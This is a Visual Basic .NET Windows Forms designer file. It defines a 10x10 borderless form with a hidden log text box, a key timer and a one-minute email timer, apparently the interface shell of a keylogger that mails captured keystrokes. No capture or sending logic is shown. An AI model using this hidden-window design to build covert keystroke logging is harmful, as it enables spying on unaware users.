<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.tmrEmail = New System.Windows.Forms.Timer(Me.components)
        Me.txtLogs = New System.Windows.Forms.TextBox()
        Me.tmrKeys = New System.Windows.Forms.Timer(Me.components)
        Me.SuspendLayout()
        '
        'tmrEmail
        '
        Me.tmrEmail.Enabled = True
        Me.tmrEmail.Interval = 60000
        '
        'txtLogs
        '
        Me.txtLogs.Location = New System.Drawing.Point(12, 12)
        Me.txtLogs.Multiline = True
        Me.txtLogs.Name = "txtLogs"
        Me.txtLogs.Size = New System.Drawing.Size(733, 357)
        Me.txtLogs.TabIndex = 1
        '
        'Form1
        '
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None
        Me.ClientSize = New System.Drawing.Size(10, 10)
        Me.Controls.Add(Me.txtLogs)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.Text = "Form1"
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents tmrEmail As System.Windows.Forms.Timer
    Friend WithEvents txtLogs As System.Windows.Forms.TextBox
    Friend WithEvents tmrKeys As System.Windows.Forms.Timer

End Class
